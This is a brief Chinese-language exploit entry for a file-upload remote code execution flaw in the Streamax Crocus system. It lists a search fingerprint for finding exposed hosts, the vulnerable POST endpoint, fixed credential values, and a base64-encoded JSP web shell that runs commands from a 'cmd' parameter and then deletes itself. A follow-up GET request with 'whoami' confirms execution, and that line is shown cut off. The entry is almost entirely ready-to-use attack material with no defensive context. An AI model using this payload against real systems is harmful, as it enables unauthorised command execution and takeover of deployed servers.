# 锐明技术Crocus系统imageupload文件上传致RCE漏洞

- **系统**：锐明技术Crocus系统imageupload文件上传致　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="/ThirdResource/respond/respond.min.js"`
- **请求**：`POST /RepairRecord.do?Action=imageupload HTTP/1.1`
- **关键头**：`Content-Type: application/json`

**请求体 / payload**
```
"username": "streamax20020818",
"license": "1",
"chnnel": 1,
"type": 1,
"imsage": "PCUgamF2YS5pby5JbnB1dFN0cmVhbSBpbiA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKS5nZXRJbnB1dFN0cmVhbSgpO2ludCBhID0gLTE7Ynl0ZVtdIGIgPSBuZXcgYnl0ZVsyMDQ4XTtvdXQucHJpbnQoIjxwcmU+Iik7d2hpbGUoKGE9aW4ucmVhZChiKSkhPS0xKXtvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIsMCxhKSk7fW91dC5wcmludCgiPC9wcmU+Iik7bmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTslPg==",
"picturename": "a.jsp"
回显必须是true
GET /SystemFile/PictureRecord/imageupload/a.jsp?cmd=whoami HT…（脚本共 612 字，完整版见原文）
```
- **预期**：200　|　—